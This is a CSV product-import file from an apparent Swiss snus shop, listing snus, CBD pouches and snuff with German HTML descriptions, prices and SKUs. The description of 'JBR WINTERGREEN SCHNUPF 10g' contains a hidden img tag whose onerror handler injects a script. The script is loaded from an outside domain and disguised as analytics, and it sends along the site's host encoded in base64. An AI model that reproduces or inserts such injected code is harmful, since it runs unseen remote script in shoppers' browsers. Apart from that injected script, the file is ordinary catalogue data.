Name,Description,SKU,Gender, Attribute 1,Attribute 1 Value, Attribute 2,Attribute 2 Value, Attribute 3,Attribute 3 Value,Base Image 1 ,Base Image 2,Base Image 3,Base Image 4,Base Image 5,Base Price(USD),Sale Price(USD),Quantity,Unit of Weight,Weight,Unit of Dimensions,Height,Width,Length,SEO Title,SEO Description,Vendor,Parent SKU
,,903,Unisex,stück,1,,,,,,,,,,5.90,,1,G,29,IN,3,3,3,,,Snus-King.ch,GRANT MELON
,,903,Unisex,stück,10,,,,,,,,,,59.00,55.00,1,G,290,IN,3,3,3,,,Snus-King.ch,GRANT MELON
GRANT ORANGE,"<ul>
<li>
<strong></strong><strong>Ab Lager verfügbar</strong>
</li>
</ul>
<p>Der neue Grant SNUS überzeugt mit seinem Geschmack jeden Snus Geniesser. Der Snus sind White Pouches und sind ohne Tabakzusatz. Der Grant Orange hat ein sehr intensiven Orangen Geschmack. </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 0                            Portionen / Dose: ~27</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak,, Kräuter</p>
<p>Nikotin (mg/g): 25mg</p>
<p>  </p>
<p> </p>
<p> Art Nr: 905</p>",GRANT ORANGE,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/grantorange.png,,,,,5.90,,1,G,29,IN,3,3,3,,,,
,,905,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,29,IN,3,3,3,,,Snus-King.ch,GRANT ORANGE
,,905,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,290,IN,3,3,3,,,Snus-King.ch,GRANT ORANGE
GRANT MINT,"<ul>
<li>
<strong></strong><strong>Ab Lager verfügbar</strong>
</li>
</ul>
<p>Der neue Grant SNUS überzeugt mit seinem Geschmack jeden Snus Geniesser. Der Snus sind White Pouches und sind ohne Tabakzusatz. Ein Sehr Minziger Geschmack </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 0                            Portionen / Dose: ~27</p>
<p>Versandgewicht (g): 40                        Geschmack: minze </p>
<p>  <span>Nikotin (mg/g): 25mg</span></p>
<p> </p>
<p> </p>
<p> </p>
<p> Art Nr: 904</p>",GRANT MINT,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/GrantMint.png,,,,,5.90,,1,G,29,IN,3,3,3,,,,
,,904,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,29,IN,3,3,3,,,Snus-King.ch,GRANT MINT
ICE MOUNTAIN MELT Melone und Granatapfel,MOUNTAIN MELONE UND GRANATAPFEL überzeugt mit seiner stärke und dem Fruchtigen Geschmack. Der ICE Mountain gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!.,ICE MOUNTAIN MELT Melone und Granatapfel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/ICEmountainmelt.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,913,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE MOUNTAIN MELT Melone und Granatapfel
,,913,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE MOUNTAIN MELT Melone und Granatapfel
ICE SUNSET Habanero and Blood Orange,ICE SUNSET HABANERO UND BLOTORANGE überzeugt mit seiner stärke und dem allzeitbeliebten Strandferien Geschmack. Der ICE Sunset gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!,ICE SUNSET Habanero and Blood Orange,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/ICEhabanero.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,915,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE SUNSET Habanero and Blood Orange
,,915,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE SUNSET Habanero and Blood Orange
ICE PERMAFROST Blueberry Mint,"<p>ICE PERMAFROST BLUEBERRY UND MINT</p>
<p>überzeugt mit seiner stärke und dem Blueberry und Mint Geschmack. Der ICE Permafrost gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!</p>",ICE PERMAFROST Blueberry Mint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/ICEPermafrost.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,912,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE PERMAFROST Blueberry Mint
,,912,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE PERMAFROST Blueberry Mint
ICE Liqourice and Raspberry,ICE Lakritz UND RASPBERRY überzeugt mit seiner stärke und dem Lakritz Geschmack. Der ICE Lakritz UND RASPBERRY gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!,ICE Liqourice and Raspberry,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/ICEliqurize.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,916,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Liqourice and Raspberry
,,916,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Liqourice and Raspberry
ICE GLACIER BREEZE Apple &Cola,ICE GLACIER BREEZE APFEL COLA überzeugt mit seiner stärke und dem brandneuen Geschmack. Der ICE Glacier Breeze gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!.,ICE GLACIER BREEZE Apple &Cola,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/ICEclassybreeze.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,914,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE GLACIER BREEZE Apple &Cola
,,914,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE GLACIER BREEZE Apple &Cola
ICE Freeze Reaper Limited Edition,,ICE Freeze Reaper Limited Edition,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_e4a958b0-850d-4ae4-8435-f125aae6e530.jpg,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,922,Unisex,Title,Default Title,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Freeze Reaper Limited Edition
ICE CBD Mint,<p>ICE CBD MINT überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Mint mit der Geschmacksrichtung Mint überzeugt jeden Kunden.</p>,ICE CBD Mint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_fbafcf7d-14b8-400d-9c74-3920c749c0b0.jpg,,,,,10.60,,1,G,1,IN,3,3,3,,,,
,,920,Unisex,Stück,1,,,,,,,,,,10.60,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Mint
,,920,Unisex,Stück,10,,,,,,,,,,100.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Mint
ICE Green Bliss CBD Apfel,<p>ICE CBD APFEL überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Apfel mit der Geschmacksrichtung Apfel überzeugt jeden Kunden.</p>,ICE Green Bliss CBD Apfel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_10dad6dd-0113-4f4a-8c37-510d5e446e82.jpg,,,,,15.00,10.50,1,G,1,IN,3,3,3,,,,
,,918,Unisex,Stück,1,,,,,,,,,,15.00,10.50,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Green Bliss CBD Apfel
,,918,Unisex,Stück,10,,,,,,,,,,120.00,100.00,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Green Bliss CBD Apfel
ICE CBD Guava,<p>ICE CBD Guava überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Guava mit der Geschmacksrichtung Guava überzeugt jeden Kunden.</p>,ICE CBD Guava,Unisex,,,,,,,,,,,,15.00,10.60,1,G,1,IN,3,3,3,,,,
,,921,Unisex,Stück,1,,,,,,,,,,15.00,10.60,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Guava
,,921,Unisex,Stück,10,,,,,,,,,,120.00,100.00,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE CBD Guava
ICE Salmiakki,ICE SALMIAKKI überzeugt mit seiner stärke und dem noch unbekannten Geschmack. Der ICE Salmiakki gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!.,ICE Salmiakki,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_18c17699-3107-4934-9383-150c65538239.jpg,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,917,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Salmiakki
,,917,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Salmiakki
ICE Frost Doublemint,"<p>ICE FROST DOUBLE MINT</p>
<p>überzeugt mit seiner stärke und dem allzeitbeliebten Geschmack Double Mint. Der ICE Frost Double Mint gehört zu den ICE Neuheiten. Der ICE Snus ist in Schweden einer der beliebtesten Snus. Nun hat er seinen weg in die Schweiz gefunden!</p>",ICE Frost Doublemint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/icefrost.png,,,,,4.90,,1,G,1,IN,3,3,3,,,,
,,911,Unisex,Stück,1,,,,,,,,,,4.90,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost Doublemint
,,911,Unisex,Stück,10,,,,,,,,,,45.00,,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost Doublemint
ICE Frost CBD Double Mint,<p>ICE CBD DOUBLE MINT überzeugt mit seiner stärke und dem CBD Anteil. CBD Produkte werden in der Schweiz immer wie beliebter. Deshalb ist es umso wichtiger CBD Snus ins Sortiment zu nehmen. Der ICE CBD Double Mint mit der Geschmacksrichtung Double Mint überzeugt jeden Kunden.</p>,ICE Frost CBD Double Mint,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_254183eb-b3b8-470e-9ec1-7668a022a317.jpg,,,,,15.00,10.90,1,G,1,IN,3,3,3,,,,
,,919,Unisex,Stück,1,,,,,,,,,,15.00,10.90,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost CBD Double Mint
,,919,Unisex,Stück,10,,,,,,,,,,120.00,100.00,1,G,1,IN,3,3,3,,,Snus-King.ch,ICE Frost CBD Double Mint
Jakobsson Cola Strong,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p><span>Der Snus kommt in original Beutel mit deutlichem Geschmack von Cola und Zitrus. Diese Sorte wurde von der CEO, Henrik Jakobsson hervorgenommen!</span></p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Salz, Säureregulator E500</p>
<p>Tabakgewicht (g): 20                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Cola</p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p> </p>
<p> </p>
<p>Art Nr: 503</p>",Jakobsson Cola Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jakobsonsstrongcola.png,,,,,5.90,,1,G,37,IN,3,3,3,,,,
,,503-4-1,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,37,IN,3,3,3,,,Snus-King,Jakobsson Cola Strong
,,503-4-10,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,370,IN,3,3,3,,,Snus-King,Jakobsson Cola Strong
Jakobsson Melone Strong,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p><span>Mit Geschmak von Melone sowie etwas Birne und Süsses. Die Beutel sind im Original Format.</span></p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 20                           Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 40                        Geschmack: Tabak, Melone, </p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p>  </p>
<p> <span>Art Nr: 500</span></p>
<p> </p>",Jakobsson Melone Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jakobsonsmelon.png,,,,,5.90,,1,G,35,IN,3,3,3,,,,
,,500-4-1,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,35,IN,3,3,3,,,Snus-King,Jakobsson Melone Strong
,,500-4-10,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,350,IN,3,3,3,,,Snus-King,Jakobsson Melone Strong
Jakobsson Mint Strong,"<p><span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""> <strong>Ab Lager verfügbar</strong></span></p>
<p><span>Ein starker Snus mit Geschmack von Minze.</span></p>
<p> </p>
<p> </p>
<p><strong>Inhaltsstoffe</strong>: Tabak, Wasser, Salz, Aromen (Raucharomen), Feuchthaltemittel E1520, Säureregulator E500</p>
<p>Tabakgewicht (g): 20                            Portionen / Dose: ~20</p>
<p>Versandgewicht (g): 39                        Geschmack: Tabak,, Kräuter, Minze</p>
<p>Nikotin (mg/g): 14.0</p>
<p> </p>
<p> Art Nr: 501</p>",Jakobsson Mint Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jakobsonsmint.png,,,,,5.90,,1,G,36,IN,3,3,3,,,,
,,501-4-1,Unisex,Stück,1,,,,,,,,,,5.90,,1,G,36,IN,3,3,3,,,Snus-King,Jakobsson Mint Strong
,,501-4-10,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,360,IN,3,3,3,,,Snus-King,Jakobsson Mint Strong
JBR RED,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>  <span>Der Neue JBR RED überzeugt min seinem neuen Geschmack. Leichter Kirsch Duft und eine kleine Spur Menthol.  Ein fruchtiger, zugleich aber auch kühlender Snuff kündigt sich an.</span></p>
<p>Ein erfrischender Schnupftabak.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p> </p>
<p>Art Nr: 1015</p>",JBR RED,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jbrred.png,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1015,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
,,1015,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
,,1015,Unisex,Stück,15,,,,,,,,,,75.00,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR RED
JBR YELLOW,"<p><span style=""color: #69b900;""> </span></p>
<div style=""text-align: left;"">
<span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span>
</div>
<div style=""text-align: left;""><span></span></div>
<p>Der Neue JBR YELLOW hat einen Menthol Geschmack. Mit seiner Neuheit überzeugt er<strong>!</strong>  </p>
<p>Ein erfrischender Schnupftabak.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p>Art Nr: 1014</p>
<p> </p>
<p> </p>
<div style=""text-align: left;"" data-mce-fragment=""1"" data-mce-style=""text-align: left;""><br></div>",JBR YELLOW,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jbryellow.png,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1014,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
,,1014,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
,,1014,Unisex,Stück,15,,,,,,,,,,75.00,0.00,1,G,20,IN,3,3,3,,,Snus-King.ch,JBR YELLOW
JBR WINTERGREEN SCHNUPF 10g,"<p><span> </span><img alt="""" src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>JBR Wintergreen - Schnupf 10g</p>
<p>Ein erfrischender Schnupftabak mit Wintergreen Aroma und feiner Spearmint Note.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p><span>Art Nr: 1001</span></p>
<div id=""mailtooptionchmailPopupModalTo"" style=""z-index: 1;""></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>",JBR WINTERGREEN SCHNUPF 10g,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jbrgreen.png,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1001,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,100,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,15,,,,,,,,,,75.00,0.00,1,G,200,IN,3,3,3,,,Snus-King,JBR WINTERGREEN SCHNUPF 10g
JBR BLUE SCHNUPF 10G,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>JBR BLUE - Schnupf 10g</p>
<p>Ein erfrischender Schnupftabak.</p>
<p>Eine Abwechslung zum klassischen Schnupftabak</p>
<p> </p>
<p> </p>
<p> Art Nr: 1003</p>",JBR BLUE SCHNUPF 10G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/jbrblue.png,,,,,6.90,,1,G,20,IN,3,3,3,,,,
,,1003,Unisex,Stück,1,,,,,,,,,,6.90,,1,G,20,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,100,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,15,,,,,,,,,,75.00,0.00,1,G,200,IN,3,3,3,,,Snus-King,JBR BLUE SCHNUPF 10G
Kurbits fäbodsnus,"<meta charset=""UTF-8"">
<p><span>Der Kurbits Fäbodsnus (Bauernhof-Snus) vereint die traditionellen Aromen und Düfte der älteren Generationen des Snushandwerks. Ein klarer Geschmack aus rustikalem Tabak trifft auf sonnenverwöhnte Blumenwiesen und klare Noten von Süße und Vanille. Die nüchternen, aber auch praktischen Gegebenheiten der Landwirtschaft und ihre abegehärteten Besitzer geben die Inspiration für einen Snus mit einem sehr ausgeprägten Geschmack und Geruch.</span></p>",Kurbits fäbodsnus,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_3d2b0662-e8f1-4139-bdbc-d380830a4bfe.jpg,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,,
,,,Unisex,Title,Default Title,,,,,,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,Snus-King.ch,Kurbits fäbodsnus
Kurbits morgondagg,"<meta charset=""UTF-8"">
<p><span>Im Kurbits Morgondagg (Morgentau) finden wir die Düfte und Erwartungen eines milden Mittsommermorgens. Blumen, Süße, Lakritz und eine vertraute Kühle von einem Morgen, der nicht wirklich von den Sonnenstrahlen erwärmt wurde. Der Tabak wurde gemischt und verarbeitet, um sich leicht, ansprechend und frisch anzufühlen.</span></p>",Kurbits morgondagg,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image.png,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,,
,,,Unisex,Title,Default Title,,,,,,,,,,8.90,4.00,1,G,1,IN,3,3,3,,,Snus-King.ch,Kurbits morgondagg
